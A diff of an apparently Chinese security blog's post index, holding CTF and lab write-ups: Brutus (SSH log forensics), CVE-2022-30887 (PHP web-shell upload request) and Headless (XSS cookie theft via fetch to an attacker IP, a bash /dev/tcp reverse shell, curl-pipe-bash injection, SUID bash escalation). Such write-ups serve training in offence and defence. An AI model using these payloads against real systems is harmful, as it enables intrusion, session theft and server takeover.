@@ -258,6 +258,61 @@
       </tags>
   </entry>
   <entry>
+    <title>Brutus-HackTheBox</title>
+    <url>/article/Brutus-HackTheBox.html</url>
+    <content><![CDATA[<p>wtmp日志文件</p>
+<span id="more"></span>
+
+
+
+<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
+<p>在这个非常简单的 Sherlock 中，您将熟悉 Unix auth.log 和 wtmp 日志。我们将探讨通过 SSH 服务对 Confluence  服务器进行暴力破解的场景。获得服务器访问权限后，攻击者执行了其他活动，我们可以使用 auth.log 进行跟踪。尽管 auth.log  主要用于暴力分析，但我们将在调查中深入研究此工件的全部潜力，包括权限升级、持久性，甚至对命令执行的一些可见性。</p>
+</blockquote>
+<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>通过分析auth.log，能否识别出攻击者进行暴力攻击所使用的IP地址？</strong></p>
+<p>打开日志文件，发现ip为<code>65.2.161.68</code>在尝试登录admin用户</p>
+<p><img src="/article/Brutus-HackTheBox/image-20240421223335647.png"></p>
+<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>暴力尝试成功，攻击者获得了服务器上帐户的访问权限。该帐户的用户名是什么？</strong></p>
+<p>我们在对成功登录的日志记录下来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2</span><br><span class="line">Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br><span class="line">Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2</span><br></pre></td></tr></table></figure>
+
+<p>不难发现第二次和第三次是攻击者登录的，对应ip为<code>65.2.161.68</code></p>
+<p>所以在尝试连续的爆破密码后，成功登录的是root用户</p>
+<p><img src="/article/Brutus-HackTheBox/image-20240421223811885.png"></p>
+<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>您能否识别攻击者手动登录服务器以实现其目标的时间戳？</strong></p>
+<p>在前一问可以知道<code>65.2.161.68</code>为攻击者ip，再来看看题目给的wtmp文件</p>
+<blockquote>
+<p><code>wtmp</code> 是跟踪 Linux 系统上登录和注销事件的三个文件之一。 <code>/var/run/utmp</code> 跟踪当前登录的用户。 <code>/var/log/wtmp</code> 保留登录和注销活动的历史日志。 <code>/var/log/btmp</code> 保留无效登录尝试的记录。</p>
+</blockquote>
+<p>我们用工具utmpdump打开，可以看到<code>65.2.161.68</code>进行了root用户登录，也就是说是攻击者手动登陆的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-03-06 06:32:45</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Brutus-HackTheBox/image-20240421224859079.png"></p>
+<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>SSH 登录会话会被跟踪并在登录时分配一个session。对于问题 2 中的用户帐户，分配给攻击者会话的session是多少？</strong></p>
+<p>我们在前面分析过<code>06:32:45</code>为攻击者登录时间，所以分析log日志文件后得到session为37</p>
+<p><img src="/article/Brutus-HackTheBox/image-20240421230448152.png"></p>
+<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>攻击者添加了一个新用户作为服务器上持久性策略的一部分，并为该新用户帐户授予了更高的权限。该帐户的名称是什么？</strong></p>
+<p>很明显给了<code>cyberjunkie</code>用户shell的权限</p>
+<p><img src="/article/Brutus-HackTheBox/image-20240421230548524.png"></p>
+<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>用于持久性的 MITRE ATT&amp;CK 子技术 ID 是什么？</strong></p>
+<p>善于使用搜索引擎</p>
+<p><img src="/article/Brutus-HackTheBox/image-20240421230752033.png"></p>
+<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>根据先前确认的身份验证时间和 auth.log 中的会话结束，攻击者的第一个 SSH 会话持续了多长时间？ （秒）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br><span class="line">Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184</span><br></pre></td></tr></table></figure>
+
+<p>不过日志上时间不准确，实际上登陆时间为<code>06:32:45</code>，所以持续了279秒</p>
+<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>攻击者登录他们的后门帐户并利用他们的更高权限下载脚本。使用 sudo 执行的完整命令是什么？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>日志分析</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Bumblebee-HackTheBox</title>
     <url>/article/Bumblebee-HackTheBox.html</url>
     <content><![CDATA[<p>对sqlite3数据库文件进行日志分析</p>
@@ -337,61 +392,6 @@
       </categories>
       <tags>
         <tag>HackTheBox</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Brutus-HackTheBox</title>
-    <url>/article/Brutus-HackTheBox.html</url>
-    <content><![CDATA[<p>wtmp日志文件</p>
-<span id="more"></span>
-
-
-
-<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
-<p>在这个非常简单的 Sherlock 中，您将熟悉 Unix auth.log 和 wtmp 日志。我们将探讨通过 SSH 服务对 Confluence  服务器进行暴力破解的场景。获得服务器访问权限后，攻击者执行了其他活动，我们可以使用 auth.log 进行跟踪。尽管 auth.log  主要用于暴力分析，但我们将在调查中深入研究此工件的全部潜力，包括权限升级、持久性，甚至对命令执行的一些可见性。</p>
-</blockquote>
-<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>通过分析auth.log，能否识别出攻击者进行暴力攻击所使用的IP地址？</strong></p>
-<p>打开日志文件，发现ip为<code>65.2.161.68</code>在尝试登录admin用户</p>
-<p><img src="/article/Brutus-HackTheBox/image-20240421223335647.png"></p>
-<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>暴力尝试成功，攻击者获得了服务器上帐户的访问权限。该帐户的用户名是什么？</strong></p>
-<p>我们在对成功登录的日志记录下来</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2</span><br><span class="line">Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br><span class="line">Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2</span><br></pre></td></tr></table></figure>
-
-<p>不难发现第二次和第三次是攻击者登录的，对应ip为<code>65.2.161.68</code></p>
-<p>所以在尝试连续的爆破密码后，成功登录的是root用户</p>
-<p><img src="/article/Brutus-HackTheBox/image-20240421223811885.png"></p>
-<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>您能否识别攻击者手动登录服务器以实现其目标的时间戳？</strong></p>
-<p>在前一问可以知道<code>65.2.161.68</code>为攻击者ip，再来看看题目给的wtmp文件</p>
-<blockquote>
-<p><code>wtmp</code> 是跟踪 Linux 系统上登录和注销事件的三个文件之一。 <code>/var/run/utmp</code> 跟踪当前登录的用户。 <code>/var/log/wtmp</code> 保留登录和注销活动的历史日志。 <code>/var/log/btmp</code> 保留无效登录尝试的记录。</p>
-</blockquote>
-<p>我们用工具utmpdump打开，可以看到<code>65.2.161.68</code>进行了root用户登录，也就是说是攻击者手动登陆的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-03-06 06:32:45</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Brutus-HackTheBox/image-20240421224859079.png"></p>
-<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>SSH 登录会话会被跟踪并在登录时分配一个session。对于问题 2 中的用户帐户，分配给攻击者会话的session是多少？</strong></p>
-<p>我们在前面分析过<code>06:32:45</code>为攻击者登录时间，所以分析log日志文件后得到session为37</p>
-<p><img src="/article/Brutus-HackTheBox/image-20240421230448152.png"></p>
-<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>攻击者添加了一个新用户作为服务器上持久性策略的一部分，并为该新用户帐户授予了更高的权限。该帐户的名称是什么？</strong></p>
-<p>很明显给了<code>cyberjunkie</code>用户shell的权限</p>
-<p><img src="/article/Brutus-HackTheBox/image-20240421230548524.png"></p>
-<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>用于持久性的 MITRE ATT&amp;CK 子技术 ID 是什么？</strong></p>
-<p>善于使用搜索引擎</p>
-<p><img src="/article/Brutus-HackTheBox/image-20240421230752033.png"></p>
-<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>根据先前确认的身份验证时间和 auth.log 中的会话结束，攻击者的第一个 SSH 会话持续了多长时间？ （秒）</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br><span class="line">Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184</span><br></pre></td></tr></table></figure>
-
-<p>不过日志上时间不准确，实际上登陆时间为<code>06:32:45</code>，所以持续了279秒</p>
-<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>攻击者登录他们的后门帐户并利用他们的更高权限下载脚本。使用 sudo 执行的完整命令是什么？</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>日志分析</category>
-      </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -574,6 +574,28 @@
       </categories>
   </entry>
   <entry>
+    <title>CVE-2022-30887</title>
+    <url>/article/CVE-2022-30887.html</url>
+    <content><![CDATA[<p>多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的，该CMS中php_action&#x2F;editProductImage.php存在任意文件上传漏洞</p>
+<span id="more"></span>
+
+<h1 id="CVE-2022-30887"><a href="#CVE-2022-30887" class="headerlink" title="CVE-2022-30887"></a>CVE-2022-30887</h1><p>打开题目，利用社工手段得到用户密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email：mayuri.infospace@gmail.com</span><br><span class="line">password：mayurik</span><br></pre></td></tr></table></figure>
+
+<p>登陆成功后找到文件上传点</p>
+<p><img src="/article/CVE-2022-30887/image-20240413113616413.png"></p>
+<p>不过这里的洞被修复了，然后找到我们可以修改存在的药品图片</p>
+<p><img src="/article/CVE-2022-30887/image-20240413123550782.png"></p>
+<p>发包即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /php_action/editProductImage.php?id=1 HTTP/1.1</span><br><span class="line">Host: eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------190811817834681586072859788548</span><br><span class="line">Content-Length: 489</span><br><span class="line">Origin: http://eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com/editproduct.php?id=1</span><br><span class="line">Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1712973768; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1712981784; googtrans=/en/zh-CN; PHPSESSID=fk5vtlalgr7ok0d8dce8l6emof; googtrans=/en/zh-CN</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;old_image&quot;</span><br><span class="line"></span><br><span class="line">tab.jpg</span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;productImage&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php system($_POST[1]);?&gt;</span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;btn&quot;</span><br><span class="line"></span><br><span class="line">-----------------------------190811817834681586072859788548--</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>春秋云镜</category>
+        <category>漏洞复现</category>
+      </categories>
+  </entry>
+  <entry>
     <title>CVE-2022-32991</title>
     <url>/article/CVE-2022-32991.html</url>
     <content><![CDATA[<p>该CMS的welcome.php中存在SQL注入攻击</p>
@@ -595,26 +617,88 @@
       </categories>
   </entry>
   <entry>
-    <title>CVE-2022-30887</title>
-    <url>/article/CVE-2022-30887.html</url>
-    <content><![CDATA[<p>多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的，该CMS中php_action&#x2F;editProductImage.php存在任意文件上传漏洞</p>
+    <title>Headless-HackTheBox</title>
+    <url>/article/Headless-HackTheBox.html</url>
+    <content><![CDATA[<p>XSS跨站脚本攻击、sh脚本提权</p>
 <span id="more"></span>
 
-<h1 id="CVE-2022-30887"><a href="#CVE-2022-30887" class="headerlink" title="CVE-2022-30887"></a>CVE-2022-30887</h1><p>打开题目，利用社工手段得到用户密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email：mayuri.infospace@gmail.com</span><br><span class="line">password：mayurik</span><br></pre></td></tr></table></figure>
+<h1 id="Headless-HackTheBox"><a href="#Headless-HackTheBox" class="headerlink" title="Headless-HackTheBox"></a>Headless-HackTheBox</h1><p>信息搜集</p>
+<p>使用nmap扫描一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.8</span><br></pre></td></tr></table></figure>
 
-<p>登陆成功后找到文件上传点</p>
-<p><img src="/article/CVE-2022-30887/image-20240413113616413.png"></p>
-<p>不过这里的洞被修复了，然后找到我们可以修改存在的药品图片</p>
-<p><img src="/article/CVE-2022-30887/image-20240413123550782.png"></p>
-<p>发包即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /php_action/editProductImage.php?id=1 HTTP/1.1</span><br><span class="line">Host: eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------190811817834681586072859788548</span><br><span class="line">Content-Length: 489</span><br><span class="line">Origin: http://eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com/editproduct.php?id=1</span><br><span class="line">Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1712973768; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1712981784; googtrans=/en/zh-CN; PHPSESSID=fk5vtlalgr7ok0d8dce8l6emof; googtrans=/en/zh-CN</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;old_image&quot;</span><br><span class="line"></span><br><span class="line">tab.jpg</span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;productImage&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php system($_POST[1]);?&gt;</span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;btn&quot;</span><br><span class="line"></span><br><span class="line">-----------------------------190811817834681586072859788548--</span><br></pre></td></tr></table></figure>
+<p><img src="/article/Headless-HackTheBox/image-20240331155537558.png"></p>
+<p>可以发现5000端口是开放的，继续扫一下目录</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331163111975.png"></p>
+<p>访问<code>/dashboard</code>发现只有admin才可以，我们注意到cookie值为JWT加密，拿到揭秘网站验证下猜想</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331173230979.png"></p>
+<p>cookie为user用户，那么我们要想访问必须拿到admin的cookie</p>
+<p>访问<code>/support</code>路径存在类似提交留言的功能，应该是存在xss注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
+<p>提交后会发现提示Hacking</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331172458874.png"></p>
+<p>说明思路没错，那么我们可以利用xss注入得到admin的cookie值，payload如下</p>
+<p>（利用fetch函数对我们服务器发送网络请求）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=1 onerror=fetch(&quot;http://10.10.14.34:80/?cookie=&quot;+document.cookie);&gt;</span><br></pre></td></tr></table></figure>
+
+<p>经过多次尝试，发现我触发payload的条件必须在<code>User-Agent</code>和<code>message</code>参数都有才行。而国外师傅们不同wp中<code>User-Agent</code>都是payload触发点，但是message参数值的不同。有的是下图这样而有的是<code>message=test;</code></p>
+<p><img src="/article/Headless-HackTheBox/image-20240331172008225.png"></p>
+<p>不过好在是拿到了admin的cookie</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331171946128.png"></p>
+<p>成功访问<code>/dashboard</code>，然后抓包发现data参数存在命令注入</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331174558986.png"></p>
+<p>尝试直接反弹shell发现不行，那么试一下用curl命令</p>
+<ol>
+<li><p>首先在本地创建shell.sh文件，写入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.34/1028 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后在本地开启http服务，用来被靶机读取文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后用curl命令去读取我们的shell.sh文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date=;curl 10.10.14.34/shell.sh |bash</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>成功反弹shell</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331175715080.png"></p>
+<p>得到user的flag</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331175800113.png"></p>
+<p>我们尝试用sudo提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>发现只有<code>/usr/bin/syscheck</code>可用</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331180740517.png"></p>
+<p>我们strings命令查看下得到源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">if [ &quot;$EUID&quot; -ne 0 ]; then</span><br><span class="line">  exit 1</span><br><span class="line">last_modified_time=$(/usr/bin/find /boot -name &#x27;vmlinuz*&#x27; -exec stat -c %Y &#123;&#125; + | /usr/bin/sort -n | /usr/bin/tail -n 1)</span><br><span class="line">formatted_time=$(/usr/bin/date -d &quot;@$last_modified_time&quot; +&quot;%d/%m/%Y %H:%M&quot;)</span><br><span class="line">/usr/bin/echo &quot;Last Kernel Modification Time: $formatted_time&quot;</span><br><span class="line">disk_space=$(/usr/bin/df -h / | /usr/bin/awk &#x27;NR==2 &#123;print $4&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;Available disk space: $disk_space&quot;</span><br><span class="line">load_average=$(/usr/bin/uptime | /usr/bin/awk -F&#x27;load average:&#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;System load average: $load_average&quot;</span><br><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
+
+<p>重点看下面这段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
+
+<p>这段代码大概意思就是，if语句先使用pgrep命令检测<code>initdb.sh</code>是否存在，如果不存在则执行该sh文件并丢弃错误输出</p>
+<p>而我们在根目录下并没有找到该sh文件，那么我们可以简单利用一下</p>
+<ol>
+<li><p>首先创建<code>initdb.sh</code>文件，写入提升权限的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;chmod u+s /bin/bash&quot; &gt; initdb.sh</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后赋予该sh脚本的执行权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x initdb.sh</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>最后sudo执行<code>/usr/bin/syscheck</code>，成功运行sh脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/syscheck</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><img src="/article/Headless-HackTheBox/image-20240331181954932.png"></p>
+<p>运行sh脚本后，用-p参数启动<code>Bash Shell</code>并以特权模式运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -p</span><br></pre></td></tr></table></figure>
+
+<p>得到root的flag</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331182210478.png"></p>
 ]]></content>
       <categories>
-        <category>春秋云镜</category>
-        <category>漏洞复现</category>
+        <category>渗透</category>
       </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>提权</tag>
+      </tags>
   </entry>
   <entry>
     <title>Clicker-HackTheBox</title>
@@ -737,162 +821,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Headless-HackTheBox</title>
-    <url>/article/Headless-HackTheBox.html</url>
-    <content><![CDATA[<p>XSS跨站脚本攻击、sh脚本提权</p>
-<span id="more"></span>
-
-<h1 id="Headless-HackTheBox"><a href="#Headless-HackTheBox" class="headerlink" title="Headless-HackTheBox"></a>Headless-HackTheBox</h1><p>信息搜集</p>
-<p>使用nmap扫描一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.8</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Headless-HackTheBox/image-20240331155537558.png"></p>
-<p>可以发现5000端口是开放的，继续扫一下目录</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331163111975.png"></p>
-<p>访问<code>/dashboard</code>发现只有admin才可以，我们注意到cookie值为JWT加密，拿到揭秘网站验证下猜想</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331173230979.png"></p>
-<p>cookie为user用户，那么我们要想访问必须拿到admin的cookie</p>
-<p>访问<code>/support</code>路径存在类似提交留言的功能，应该是存在xss注入。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>提交后会发现提示Hacking</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331172458874.png"></p>
-<p>说明思路没错，那么我们可以利用xss注入得到admin的cookie值，payload如下</p>
-<p>（利用fetch函数对我们服务器发送网络请求）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=1 onerror=fetch(&quot;http://10.10.14.34:80/?cookie=&quot;+document.cookie);&gt;</span><br></pre></td></tr></table></figure>
-
-<p>经过多次尝试，发现我触发payload的条件必须在<code>User-Agent</code>和<code>message</code>参数都有才行。而国外师傅们不同wp中<code>User-Agent</code>都是payload触发点，但是message参数值的不同。有的是下图这样而有的是<code>message=test;</code></p>
-<p><img src="/article/Headless-HackTheBox/image-20240331172008225.png"></p>
-<p>不过好在是拿到了admin的cookie</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331171946128.png"></p>
-<p>成功访问<code>/dashboard</code>，然后抓包发现data参数存在命令注入</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331174558986.png"></p>
-<p>尝试直接反弹shell发现不行，那么试一下用curl命令</p>
-<ol>
-<li><p>首先在本地创建shell.sh文件，写入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.34/1028 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>然后在本地开启http服务，用来被靶机读取文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>然后用curl命令去读取我们的shell.sh文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date=;curl 10.10.14.34/shell.sh |bash</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>成功反弹shell</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331175715080.png"></p>
-<p>得到user的flag</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331175800113.png"></p>
-<p>我们尝试用sudo提权</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-
-<p>发现只有<code>/usr/bin/syscheck</code>可用</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331180740517.png"></p>
-<p>我们strings命令查看下得到源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">if [ &quot;$EUID&quot; -ne 0 ]; then</span><br><span class="line">  exit 1</span><br><span class="line">last_modified_time=$(/usr/bin/find /boot -name &#x27;vmlinuz*&#x27; -exec stat -c %Y &#123;&#125; + | /usr/bin/sort -n | /usr/bin/tail -n 1)</span><br><span class="line">formatted_time=$(/usr/bin/date -d &quot;@$last_modified_time&quot; +&quot;%d/%m/%Y %H:%M&quot;)</span><br><span class="line">/usr/bin/echo &quot;Last Kernel Modification Time: $formatted_time&quot;</span><br><span class="line">disk_space=$(/usr/bin/df -h / | /usr/bin/awk &#x27;NR==2 &#123;print $4&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;Available disk space: $disk_space&quot;</span><br><span class="line">load_average=$(/usr/bin/uptime | /usr/bin/awk -F&#x27;load average:&#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;System load average: $load_average&quot;</span><br><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
-
-<p>重点看下面这段</p>
